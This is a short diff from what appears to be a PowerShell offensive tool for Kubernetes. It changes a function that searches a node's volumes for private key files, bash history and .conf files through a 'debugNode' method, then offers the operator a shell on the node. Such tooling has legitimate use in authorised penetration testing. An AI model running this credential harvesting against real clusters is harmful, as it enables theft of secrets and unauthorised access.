@@ -93,18 +93,18 @@ function Get-SensitiveInformationFromNode{
 
                 if($extensions.Count -gt 0){
                     Foreach($extension in $extensions){
-                        Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension $extension -token $token
+                        Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension $extension -accesstoken $token -method "debugNode"
                     }
                 }
                 else{
                     Write-Host "No extensions where given performing regular search:"
                     Write-Host "Searching for any key file on different volumes"
                     Write-Host ""
-                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".key" -token $token
+                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".key" -accesstoken $token -method "debugNode"
                     Write-Host "Searching for BashHistory"
-                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".bash_history" -token $token
+                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".bash_history" -accesstoken $token -method "debugNode"
                     Write-Host "Searching for configuration files with .conf"
-                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".conf" -token $token
+                    Get-FileExtensionsFromVolumesInNodes -namespace $namespace -nodeName $nodeName -extension ".conf" -accesstoken $token -method "debugNode"
                 }
               
                 Write-Host "We ware able to retrieve some information do you want shell in the system?"
